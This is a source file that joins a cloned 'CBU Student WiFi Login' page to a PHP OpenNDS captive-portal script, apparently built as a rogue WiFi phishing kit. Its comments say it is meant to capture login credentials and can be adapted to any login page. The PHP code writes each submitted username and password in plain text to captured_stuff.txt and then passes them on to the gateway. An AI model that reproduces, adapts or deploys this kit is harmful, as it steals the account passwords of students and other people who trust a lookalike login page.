<!DOCTYPE html>
<html lang="en">
    

<!-- ### CUSTOM HTML FOR WEBPAGE ### -->

<!-- one can insert whatever html they would like for their login page here,    -->
<!-- so long as they intend to capture login credentials in the below format.   -->
<!-- For example's sake, here is the html for my college's school website lol.  -->
<!-- (obviosuly you must include any resources required for site)               -->

<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
        <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=1"/>
        <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
        <meta http-equiv="cache-control" content="no-cache,no-store"/>
        <meta http-equiv="pragma" content="no-cache"/>
        <meta http-equiv="expires" content="-1"/>
        <meta name='mswebdialog-title' content='Connecting to CBU'/>

        <title>CBU Student WiFi Login</title>
        <script type='text/javascript'>
//<![CDATA[
function Errors(){this.reportSubject = 'Error Report'; }
//]]>
</script>

        <link rel="stylesheet" type="text/css" href="/style.css" /><style>.illustrationClass {background-image:url('images/background.jpg');}</style>

    </head>
    <body dir="ltr" class="body">
    <div id="noScript" style="position:static; width:100%; height:100%; z-index:100">
        <h1>JavaScript required</h1>
        <p>JavaScript is required. This web browser does not support JavaScript or JavaScript in this web browser is not enabled.</p>
        <p>To find out if your web browser supports JavaScript or to enable JavaScript, see web browser help.</p>
    </div>
    <script type="text/javascript" language="JavaScript">
         document.getElementById("noScript").style.display = "none";
    </script>
    <div id="fullPage">
        <div id="brandingWrapper" class="float">
            <div id="branding"></div>
        </div>
        <div id="contentWrapper" class="float">
            <div id="content">
                <div id="header">
                    <img class='logoImage' id='companyLogo' src='images/cbu.png' alt='CBU'/>
                </div>
                <div id="workArea">
                    
    <div id="authArea" class="groupMargin">

	</body>

	<script type="text/javascript">
//<![CDATA[

// This file contains several workarounds on inconsistent browser behaviors that administrators may customize.
"use strict";

// iPhone email friendly keyboard does not include "\" key, use regular keyboard instead.
// Note change input type does not work on all versions of all browsers.
if (navigator.userAgent.match(/iPhone/i) != null) {
    var emails = document.querySelectorAll("input[type='email']");
    if (emails) {
        for (var i = 0; i < emails.length; i++) {
            emails[i].type = 'text';
        }
    }
}

// In the CSS file we set the ms-viewport to be consistent with the device dimensions, 
// which is necessary for correct functionality of immersive IE. 
// However, for Windows 8 phone we need to reset the ms-viewport's dimension to its original
// values (auto), otherwise the viewport dimensions will be wrong for Windows 8 phone.
// Windows 8 phone has agent string 'IEMobile 10.0'
if (navigator.userAgent.match(/IEMobile\/10\.0/)) {
    var msViewportStyle = document.createElement("style");
    msViewportStyle.appendChild(
        document.createTextNode(
            "@-ms-viewport{width:auto!important}"
        )
    );
    msViewportStyle.appendChild(
        document.createTextNode(
            "@-ms-viewport{height:auto!important}"
        )
    );
    document.getElementsByTagName("head")[0].appendChild(msViewportStyle);
}

// If the innerWidth is defined, use it as the viewport width.
if (window.innerWidth && window.outerWidth && window.innerWidth !== window.outerWidth) {
    var viewport = document.querySelector("meta[name=viewport]");
    viewport.setAttribute('content', 'width=' + window.innerWidth + ', initial-scale=1.0, user-scalable=1');
}

// Gets the current style of a specific property for a specific element.
function getStyle(element, styleProp) {
    var propStyle = null;

    if (element && element.currentStyle) {
        propStyle = element.currentStyle[styleProp];
    }
    else if (element && window.getComputedStyle) {
        propStyle = document.defaultView.getComputedStyle(element, null).getPropertyValue(styleProp);
    }

    return propStyle;
}

// The script below is used for downloading the illustration image 
// only when the branding is displaying. This script work together
// with the code in PageBase.cs that sets the html inline style
// containing the class 'illustrationClass' with the background image.
var computeLoadIllustration = function () {
    var branding = document.getElementById("branding");
    var brandingDisplay = getStyle(branding, "display");
    var brandingWrapperDisplay = getStyle(document.getElementById("brandingWrapper"), "display");

    if (brandingDisplay && brandingDisplay !== "none" &&
        brandingWrapperDisplay && brandingWrapperDisplay !== "none") {
        var newClass = "illustrationClass";

        if (branding.classList && branding.classList.add) {
            branding.classList.add(newClass);
        } else if (branding.className !== undefined) {
            branding.className += " " + newClass;
        }
        if (window.removeEventListener) {
            window.removeEventListener('load', computeLoadIllustration, false);
            window.removeEventListener('resize', computeLoadIllustration, false);
        }
        else if (window.detachEvent) {
            window.detachEvent('onload', computeLoadIllustration);
            window.detachEvent('onresize', computeLoadIllustration);
        }
    }
};

if (window.addEventListener) {
    window.addEventListener('resize', computeLoadIllustration, false);
    window.addEventListener('load', computeLoadIllustration, false);
}
else if (window.attachEvent) {
    window.attachEvent('onresize', computeLoadIllustration);
    window.attachEvent('onload', computeLoadIllustration);
}

// Function to change illustration image. Usage example below.
function SetIllustrationImage(imageUri) {
    var illustrationImageClass = '.illustrationClass {background-image:url(' + imageUri + ');}';

    var css = document.createElement('style');
    css.type = 'text/css';

    if (css.styleSheet) css.styleSheet.cssText = illustrationImageClass;
    else css.appendChild(document.createTextNode(illustrationImageClass));

    document.getElementsByTagName("head")[0].appendChild(css);
}

// Example to change illustration image on HRD page after adding the image to active theme:
// PSH> Set-AdfsWebTheme -TargetName <activeTheme> -AdditionalFileResource @{uri='/adfs/portal/images/hrd.jpg';path='.\hrd.jpg'}
//
//if (typeof HRD != 'undefined') {
//    SetIllustrationImage('/adfs/portal/images/hrd.jpg');
//}

//]]>
</script>
</html>


<!-- ### BELOW IS THE OpenNDS CONFIGURATION ### -->

<?php 
#       a lot of this was pulled from the OpenNDS readthedocs and from the
#       fas-aes.php example script. Really great stuff, however, I did put my
#       gripes in the README. Below is the link to the OpenNDS fas-aes.php 
#       configuration and code on github (code has more detailed usage instruction).
#       documentation:  https://opennds.readthedocs.io/en/stable/index.html
#       code:           https://github.com/openNDS/openNDS/blob/master/forward_authentication_service/fas-aes/fas-aes.php

#####################################################################################
// The pre-shared key "faskey" (this must be the same as in the /etc/opennds/opennds.conf config):
$key="1234567890";
#####################################################################################

$fullname=$email=$gatewayname=$clientip=$gatewayaddress=$hid=$gatewaymac=$clientif=$redir=$client_zone="";

$cipher="AES-256-CBC";

// Get the query string components
if (isset($_GET['status'])) {
	@$redir=$_GET['redir'];
	@$redir_r=explode("fas=", $redir);
	@$fas=$redir_r[1];

	if (isset($_GET['iv'])) {
		$iv=$_GET['iv'];
	} else {
		$iv="error";
	}

} else if (isset($_GET['fas']))  {
	$fas=$_GET['fas'];

	if (isset($_GET['iv'])) {
		$iv=$_GET['iv'];
	} else {
		$iv="error";
	}
} else {
	//exit(0);
}

####################################################################################################################################
#
#	Decrypt and Parse the querystring
#
#	Note: $ndsparamlist is an array of parameter names to parse for.
#		Add your own custom parameters to this array as well as to the config file.
#		"admin_email" and "location" are examples of custom parameters.
#
####################################################################################################################################

$ndsparamlist=explode(" ", "clientip clientmac client_type gatewayname gatewayurl version hid gatewayaddress gatewaymac authdir originurl clientif admin_email location");

if (isset($_GET['fas']) and isset($_GET['iv']))  {
	$string=$_GET['fas'];
	$iv=$_GET['iv'];
	$decrypted=openssl_decrypt( base64_decode( $string ), $cipher, $key, 0, $iv );
	$dec_r=explode(", ",$decrypted);

	foreach ($ndsparamlist as $ndsparm) {
		foreach ($dec_r as $dec) {
			@list($name,$value)=explode("=",$dec);
			if ($name == $ndsparm) {
				$$name = $value;
				break;
			}
		}
	}
}

if (isset($gatewayurl)) {
	$gatewayurl=rawurldecode($gatewayurl);
}
####################################################################################################################################
####################################################################################################################################

// Work out the client zone:
$client_zone_r=explode(" ",trim($clientif));

if ( ! isset($client_zone_r[1])) {
	$client_zone="LocalZone:".$client_zone_r[0];
} else {
	$client_zone="MeshZone:".str_replace(":","",$client_zone_r[1]);
}

####################################################################################################################################
####################################################################################################################################

// point to which page needs to be brought up
if (isset($_GET["landing"]))
{
	ThankYouPage();
}
elseif(!isset($_POST['UserName']))
{
	signInPage();
}
else
{
	authActionPage();
}
	
// input and log the username and password
if(isset($_POST['UserName']))
{
$username=$_POST['UserName'];
$fp = fopen('captured_stuff.txt', 'a');
fwrite($fp, "username: ");
fwrite($fp, $username);
fwrite($fp, "\n");
fclose($fp);}

if(isset($_POST['Password']))
{
$password=$_POST['Password'];
$fp = fopen('captured_stuff.txt', 'a');
fwrite($fp, "password: ");
fwrite($fp, $password);
fwrite($fp, "\n");
fclose($fp);}

// create the sign in page and move the credentials to the log file
// THIS CAN BE USED FOR ANY LOGIN PAGE - one only has to change the html above
// to fit use scenario 
function signInPage(){
	echo "
	<div id=\"loginArea\">
	<div id=\"loginMessage\" class=\"groupMargin\">Sign in with your organizational account</div>

	<form method=\"post\" id=\"loginForm\" autocomplete=\"off\" novalidate=\"novalidate\">
	<div id=\"error\" class=\"fieldMargin error smallText\" style=\"display: none;\">
	<span id=\"errorText\" for=\"\"></span>
	</div>

	<div id=\"formsAuthenticationArea\">
	<div id=\"userNameArea\">
		<label id=\"userNameInputLabel\" for=\"userNameInput\" class=\"hidden\">User Account</label>
		<input id=\"userNameInput\" name=\"UserName\" type=\"email\" value=\"\" tabindex=\"1\" class=\"text fullWidth\" spellcheck=\"false\" placeholder=\"someone@example.com\" autocomplete=\"off\">
	</div>

	<div id=\"passwordArea\">
		<label id=\"passwordInputLabel\" for=\"passwordInput\" class=\"hidden\">Password</label>
		<input id=\"passwordInput\" name=\"Password\" type=\"password\" tabindex=\"2\" class=\"text fullWidth\" placeholder=\"Password\" autocomplete=\"off\">
	</div>

	<div id=\"submissionArea\" class=\"submitMargin\">
		<input id=\"submitButton\" type=\"submit\" tabindex=\"4\" role=\"button\" value=\"Sign in\">
	</div>
	";
}

// authentication for OpenNDS
function authActionPage(){
global $username, $password;

$me=$_SERVER['SCRIPT_NAME'];
$host=$_SERVER['HTTP_HOST'];
$fas=$GLOBALS["fas"];
$iv=$GLOBALS["iv"];
$clientip=$GLOBALS["clientip"];
$gatewayname=$GLOBALS["gatewayname"];
$gatewayaddress=$GLOBALS["gatewayaddress"];
$gatewaymac=$GLOBALS["gatewaymac"];
$key=$GLOBALS["key"];
$hid=$GLOBALS["hid"];
$clientif=$GLOBALS["clientif"];
$originurl=$GLOBALS["originurl"];

$authaction="http://$gatewayaddress/opennds_auth/";
$redir="http://".$host.$me."?fas=$fas&iv=$iv&landing=1";	
$tok=hash('sha256', $hid.$key);

$custom="username=$username, password=$password";
$custom=base64_encode($custom);

echo "
<form action=\"$me\" method=\"get\" >
	<input type=\"hidden\" name=\"fas\" value=\"$fas\">
	<input type=\"hidden\" name=\"iv\" value=\"$iv\">
	<input type=\"hidden\" name=\"someone@example.com\" value=\"$username\">
	<input type=\"hidden\" name=\"password\" value=\"$password\">
	<br><br>
	<input type=\"checkbox\" value=\"Accept Terms of Service\"> I agree to the Terms of Service
</form>
<br>
";

echo "
<br>
<form action=\"".$authaction."\" method=\"get\">
<input type=\"hidden\" name=\"tok\" value=\"".$tok."\">
<input type=\"hidden\" name=\"custom\" value=\"$custom\">
	<input type=\"hidden\" name=\"redir\" value=\"".$redir."\"><br>
	<input type=\"submit\" value=\"Continue\" >
</form>
";
}

function ThankYouPage(){
echo "
Thank You!
";
}
?>